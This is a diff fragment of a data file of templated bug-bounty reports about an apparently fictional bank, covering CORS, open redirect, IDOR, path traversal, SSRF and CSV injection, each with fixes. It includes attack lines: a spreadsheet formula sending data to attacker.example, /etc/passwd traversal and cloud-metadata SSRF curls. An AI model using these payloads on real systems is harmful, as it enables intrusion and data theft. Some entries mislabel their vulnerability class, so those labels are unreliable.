+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://mobile.glaciervaultbank.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10043,7 +10118,8 @@
           "offset": "1d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://mobile.glaciervaultbank.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10202,7 +10278,8 @@
           "offset": "5d 7h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://mobile.glaciervaultbank.foo/profile`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10322,7 +10399,8 @@
           "offset": "1d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://banking.glaciervaultbank.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10438,7 +10516,8 @@
           "offset": "3h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://banking.glaciervaultbank.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10544,7 +10623,8 @@
           "offset": "6d 7h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.glaciervaultbank.foo/v2/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10655,7 +10735,8 @@
           "offset": "5d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://mobile.glaciervaultbank.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10773,7 +10854,8 @@
           "offset": "8d 13h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://mobile.glaciervaultbank.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10874,7 +10956,8 @@
           "offset": "6d 19h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://mobile.glaciervaultbank.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10994,7 +11077,8 @@
           "offset": "3d 20h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.glaciervaultbank.foo/v2/admin/queue`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11133,7 +11217,8 @@
           "offset": "7d 23h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://banking.glaciervaultbank.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11254,7 +11339,8 @@
           "offset": "5d 13h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://banking.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11369,7 +11455,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://banking.glaciervaultbank.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11492,7 +11579,8 @@
           "offset": "8d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.glaciervaultbank.foo/v2/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11607,7 +11695,8 @@
           "offset": "2d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.glaciervaultbank.foo/v2/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11759,7 +11848,8 @@
           "offset": "8d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.glaciervaultbank.foo/v2/api/documents/`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11879,7 +11969,8 @@
           "offset": "1d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://mobile.glaciervaultbank.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12039,7 +12130,8 @@
           "offset": "4d 7h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.glaciervaultbank.foo/v2/api/documents/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12159,7 +12251,8 @@
           "offset": "4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://banking.glaciervaultbank.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12271,7 +12364,8 @@
           "offset": "2d 9h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.glaciervaultbank.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12411,7 +12505,8 @@
           "offset": "4d 15h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.glaciervaultbank.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12555,7 +12650,8 @@
           "offset": "5d 15h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.glaciervaultbank.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12663,7 +12759,8 @@
           "offset": "1d 10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://banking.glaciervaultbank.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12790,7 +12887,8 @@
           "offset": "5d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://banking.glaciervaultbank.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12914,7 +13012,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.glaciervaultbank.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13009,7 +13108,8 @@
           "offset": "3d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://banking.glaciervaultbank.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13098,7 +13198,8 @@
           "offset": "2d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://banking.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13238,7 +13339,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://banking.glaciervaultbank.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13386,7 +13488,8 @@
           "offset": "3d 15h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://banking.glaciervaultbank.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13510,7 +13613,8 @@
           "offset": "5d",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.glaciervaultbank.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13614,7 +13718,8 @@
           "offset": "17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.glaciervaultbank.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13750,7 +13855,8 @@
           "offset": "6d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
